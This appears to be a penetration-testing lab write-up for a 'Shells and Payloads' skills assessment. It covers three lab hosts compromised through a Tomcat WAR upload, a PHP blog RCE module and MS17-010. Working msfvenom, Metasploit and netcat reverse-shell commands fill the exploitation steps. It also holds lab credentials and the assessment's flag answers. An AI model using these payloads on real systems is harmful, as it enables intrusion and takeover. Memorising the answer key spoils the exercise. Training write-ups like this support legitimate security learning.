# Skills Assessment — Shells and Payloads

**Status:** ✅ COMPLETE — All 3 hosts exploited, all flags captured

---

## Target Environment

**Foothold Access:**
- **Method:** RDP via `xfreerdp`
- **IP:** `10.129.66.212`
- **Credentials:** `htb-student` / `HTB_@cademy_stdnt!`

**Network:** Internal inlanefreight network `172.16.0.0/23`

### Target Hosts

| Host | OS/Type | Address | Exploit Vector | Creds/Notes |
|------|---------|---------|----------------|-------------|
| **Host-01** | Windows | 172.16.1.11:8080 | Tomcat WAR upload | `tomcat:Tomcatadm` |
| **Host-02** | Ubuntu | 172.16.1.12 (blog vhost) | PHP blog RCE (50064.rb) | `admin:admin123!@#` |
| **Host-03** | Windows | 172.16.1.13 | MS17-010 psexec | N/A |

### Objectives ✅
- [x] Interactive shell from Windows host (Host-01)
- [x] Interactive shell from Web application (Host-02)
- [x] Interactive shell from Linux host (Host-03) — *actually Windows, lab quirk*
- [x] Identify shell environment on each victim

---

## Connection

```bash
xfreerdp 10.129.66.212 /u:htb-student /p:HTB_@cademy_stdnt!
# Then re-enter creds in GUI prompt
```

> ⚠️ **Critical:** Start listeners on foothold's **internal IP** (`172.16.1.5`), not `0.0.0.0`.

---

## Reconnaissance (From Foothold)

**Creds found on foothold desktop:**
```bash
cat Desktop/access-creds.txt
# Blog: admin / admin123!@#
# Tomcat: tomcat / Tomcatadm
```

**Host discovery via nmap:**
```bash
nmap -sC -sV -Pn -oN nmap.initial.host1 172.16.1.11  # Tomcat on 8080
nmap -sC -sV -Pn -oN nmap.initial.host2 172.16.1.12  # Blog (needs vhost)
nmap -sC -sV -Pn -oN nmap.initial.host3 172.16.1.13  # SMB (EternalBlue)
```

---

## Exploitation

### Host-01: Windows Tomcat (172.16.1.11:8080)
**Vector:** Tomcat Manager WAR deployment  
**Shell:** Java JSP reverse → netcat  
**Creds:** `tomcat:Tomcatadm` (from foothold desktop)

```bash
# Generate payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f war -o shell.war

# Start listener
nc -lnvp 4444

# Deploy via Tomcat Manager, trigger at /shell/
```

**Shell identified:** `cmd.exe` (Windows Command Prompt) via JSP

**Flag:** `C:\Shares\dev-share` → Answer: **dev-share**

---

### Host-02: Ubuntu Blog (172.16.1.12)
**Vector:** "Lightweight Facebook-styled blog v1.3" authenticated RCE (50064.rb)  
**Shell:** PHP meterpreter → upgraded to shell  
**Creds:** `admin:admin123!@#`

**Key issue:** Default vhost returned wrong page; needed `Host: blog.inlanefreight.local` header

```bash
# In msfconsole
use exploit/unix/webapp/50064
set RHOSTS 172.16.1.12
set VHOST blog.inlanefreight.local
set USERNAME admin
set PASSWORD admin123!@#
set payload php/meterpreter/reverse_tcp
set LHOST 172.16.1.5
set LPORT 4445
run

# In meterpreter
meterpreter > shell
```

**Shell identified:** `bash` (Ubuntu Linux)

**Distro:** `ubuntu` (from `/etc/os-release`)

**Flag:** `/customscripts/flag.txt` → **B1nD_Shells_r_cool**

---

### Host-03: Windows SMB (172.16.1.13)
**Vector:** MS17-010 EternalBlue via psexec variant  
**Shell:** PowerShell → Command Prompt  
**Note:** Direct EternalBlue exploit failed; `ms17_010_psexec` succeeded

```bash
use exploit/windows/smb/ms17_010_psexec
set RHOSTS 172.16.1.13
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.1.5
set LPORT 4446
run

meterpreter > shell
type C:\Users\Administrator\Desktop\Skills-flag.txt
```

**Shell identified:** `cmd.exe` (Windows) via PowerShell execution

**Flag:** `C:\Users\Administrator\Desktop\Skills-flag.txt` → **One-H0st-Down!**

---

## Flags / Answers

| # | Question | Answer |
|---|----------|--------|
| 1 | Hostname of Host-1 (lowercase) | `shells-winsvr` |
| 2 | Folder in C:\Shares\ (lowercase) | **dev-share** |
| 3 | Linux distro on Host-2 (lowercase) | **ubuntu** |
| 4 | Shell language for 50064.rb exploit | **php** |
| 5 | Contents of /customscripts/flag.txt | **B1nD_Shells_r_cool** |
| 6 | Contents of Skills-flag.txt | **One-H0st-Down!** |

---

## Shell Environments Summary

| Host | Shell Type | Upgrade Method |
|------|------------|----------------|
| Host-01 | `cmd.exe` (Windows) | N/A — was interactive JSP |
| Host-02 | `bash` (Linux) | Python PTY: `python -c 'import pty; pty.spawn("/bin/bash")'` |
| Host-03 | `cmd.exe` (Windows via PS) | N/A — meterpreter → shell |

---

## Key Lessons

1. **Always check foothold for creds** — `access-creds.txt` on desktop saved brute force time
2. **Tomcat Manager = WAR files** — `msfvenom -f war` not `-f raw`
3. **Vhost matters** — `blog.inlanefreight.local` vs default catch-all page
4. **EternalBlue variants** — Direct exploit failed; `psexec` variant worked on Server 2016
5. **Meterpreter vs raw shells** — PHP meterpreter for complex; `nc` for simple
6. **Listener IP critical** — Use foothold's **internal** `172.16.1.5`, not `0.0.0.0` or external
